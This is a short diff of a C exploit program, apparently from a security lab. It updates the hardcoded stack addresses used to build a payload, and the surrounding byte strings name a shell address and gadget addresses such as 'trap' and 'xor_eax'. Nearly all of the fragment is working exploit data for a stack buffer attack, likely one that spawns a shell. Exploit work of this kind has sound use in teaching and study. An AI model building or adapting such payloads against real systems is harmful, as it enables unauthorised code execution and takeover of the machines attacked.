@@ -8,10 +8,10 @@
 int main(void)
 {
   char bufr[200];
-  // bufr address = bfbf57e5
-  char null_arg_addr[] = "\x8c\x58\xbf\xbf";
-  char shell_addr[] = "\x9c\x58\xbf\xbf";
-  char prev_addr[] = "\x90\x58\xbf\xbf";
+  // bufr address = bfbf671d
+  char null_arg_addr[] = "\xd0\x67\xbf\xbf";
+  char shell_addr[] = "\xd4\x67\xbf\xbf";
+  char prev_addr[] = "\xc8\x67\xbf\xbf";
 
   char trap[] = "\xe5\xb6\xa9\xbb";
   char xor_eax[] = "\xc2\xb3\xa9\xbb";
